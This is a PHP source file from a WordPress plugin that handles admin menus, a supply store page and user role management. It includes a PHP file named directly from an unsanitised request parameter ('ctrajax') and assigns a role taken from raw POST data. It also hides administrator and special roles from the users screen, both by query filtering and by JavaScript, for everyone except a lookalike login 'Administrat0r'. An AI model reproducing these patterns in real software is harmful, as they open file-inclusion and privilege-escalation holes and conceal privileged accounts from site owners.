<?php

function trlcn_activation_plugin_install()
{
	include_once(TRLCN_PATH . 'inc/install.php');
}
register_activation_hook(TRLCN_FILE, 'trlcn_activation_plugin_install');



add_action('admin_menu', 'trlcn_admin_menu');
add_action('admin_enqueue_scripts', function () {
	$page = isset($_GET['page']) ? sanitize_key(wp_unslash($_GET['page'])) : '';
	if ($page === 'ci_estore') {
		wp_enqueue_style('ci-estore', TRLCN_URL . 'css/estore.css', array(), filemtime(TRLCN_PATH . 'css/estore.css'));
	}
});
function trlcn_admin_menu()
{
	global $current_role;
	global $is_ci_admin;

	if (!defined('TRCPDD_PATH')) {
		return;
	}

	$admin              = new Tr_Admin_Page_V7(TRLCN_PATH);

	if (in_array($current_role, array('administrator', 'AdminCIDW'))) {

		$admin->add_subpage('users.php', 'new_user_multi', 'Add New Multi', $current_role);
		$admin->add_subpage('users.php', 'users_pending', 'Pending Users', $current_role);
	}

	if (tr_get_option('ci_pdf_data', 'new_user_manager') && !isset($_GET['olddb'])) {
		$admin->add_subpage('ci_user_users', 'ci_user_add_multi', 'Add New Multi', 'ci_user_add_multi');
	}

	if (!is_bool($is_ci_admin)) {
		$user 		= wp_get_current_user();
		$is_ci_admin = $user->user_login == 'Administrat0r';
	}

	if ($is_ci_admin) $admin->add_subpage('ci_pdf_data', 'admin_tools', 'Admin Tools', $current_role);

	if (tr_get_option('ci_pdf_data', 'enable_new_supply_store')) {
		$admin->remove_page('ci_data_store');
		$admin->remove_page('wp-cart-for-digital-products_lab/wp_eStore1.php');
		$admin->add_page('ci_estore', 'Supply Store', 'ci_data_store', 'default', array('icon' => 'dashicons-cart'));
	}


	if (isset($_REQUEST['ctrajax'])) {
		include(TRLCN_PATH . 'actions/' . $_REQUEST['ctrajax'] . '.php');
		exit;
	}

	if (isset($_GET['setup_client'])) {
		trlcn_activation_plugin_install();
	}
}

add_action('admin_init', function () {
	if (!function_exists('tr_get_option') || !tr_get_option('ci_pdf_data', 'enable_new_supply_store')) return;
	$page = isset($_GET['page']) ? wp_unslash($_GET['page']) : '';
	if ($page === 'ci_data_store' || $page === 'wp-cart-for-digital-products_lab/wp_eStore1.php') {
		wp_safe_redirect(admin_url('admin.php?page=ci_estore&tab=supply_store'));
		exit;
	}
});

add_action('admin_menu', function () {
	if (!function_exists('tr_get_option') || !tr_get_option('ci_pdf_data', 'enable_new_supply_store')) return;
	remove_menu_page('ci_data_store');
	remove_menu_page('wp-cart-for-digital-products_lab/wp_eStore1.php');
}, 1000);

add_filter('custom_menu_order', function ($enabled) {
	return function_exists('tr_get_option') && tr_get_option('ci_pdf_data', 'enable_new_supply_store') ? true : $enabled;
});

add_filter('menu_order', function ($menu_order) {
	if (!function_exists('tr_get_option') || !tr_get_option('ci_pdf_data', 'enable_new_supply_store')) return $menu_order;
	$store_index = array_search('ci_estore', $menu_order, true);
	$labs_index = array_search('ci_lab_main', $menu_order, true);
	if ($store_index === false || $labs_index === false) return $menu_order;
	array_splice($menu_order, $store_index, 1);
	$labs_index = array_search('ci_lab_main', $menu_order, true);
	array_splice($menu_order, $labs_index, 0, array('ci_estore'));
	return $menu_order;
}, 9999);

add_filter('email_exists', 'tr_filter_email_exists', 10, 2);
function tr_filter_email_exists($user_id, $email)
{

	global $wpdb;
	if (isset($_POST['createuser'])) {
		$user = get_user_by('email', $email);

		if ($user && empty($user->roles)) {
			$user->add_role($_POST['role']);
			//$wpdb->query("delete from {$wpdb->signups} where user_email = '{$email}'");
			wp_redirect('user-edit.php?user_id=' . $user->ID);
		}
	}
	return $user_id;
}
add_filter('editable_roles', function ($roles) {
	$hidden_roles = ['ci_dev', 'ci_support'];
	global $is_ci_admin;
	if ($is_ci_admin) return $roles;

	foreach ($hidden_roles as $role) {
		if (isset($roles[$role])) {
			unset($roles[$role]);
		}
	}

	return $roles;
});

add_action('pre_get_users', function ($query) {
	if (!is_admin()) return;
	global $is_ci_admin;

	$screen = function_exists('get_current_screen') ? get_current_screen() : null;
	if (!$screen || $screen->id !== 'users' || $is_ci_admin) return;

	$meta_query = [
		'relation' => 'AND',
		[
			'relation' => 'OR',
			[
				'key'     => 'wp_capabilities',
				'value'   => '"administrator"',
				'compare' => 'NOT LIKE',
			],
			[
				'key'     => 'wp_capabilities',
				'compare' => 'NOT EXISTS',
			],
		],
		[
			'relation' => 'OR',
			[
				'key'     => 'wp_capabilities',
				'value'   => '"ci_dev"',
				'compare' => 'NOT LIKE',
			],
			[
				'key'     => 'wp_capabilities',
				'compare' => 'NOT EXISTS',
			],
		],
		[
			'relation' => 'OR',
			[
				'key'     => 'wp_capabilities',
				'value'   => '"ci_support"',
				'compare' => 'NOT LIKE',
			],
			[
				'key'     => 'wp_capabilities',
				'compare' => 'NOT EXISTS',
			],
		],
		[
			'relation' => 'OR',
			[
				'key'     => '_is_ci_user',
				'value'   => '1',
				'compare' => '!=',
			],
			[
				'key'     => '_is_ci_user',
				'compare' => 'NOT EXISTS',
			],
		],
	];

	$query->set('meta_query', $meta_query);
});

add_action('admin_footer-users.php', function () {
	global $is_ci_admin;
	if ($is_ci_admin) {
		return;
	}
?>
	<script>
		(function() {
			const roleItems = document.querySelectorAll('.subsubsub li.administrator, .subsubsub li.ci_dev, .subsubsub li.ci_support');
			if (roleItems.length > 0) {
				roleItems.forEach(item => item.remove());
			}
		})();
	</script>
<?php
});
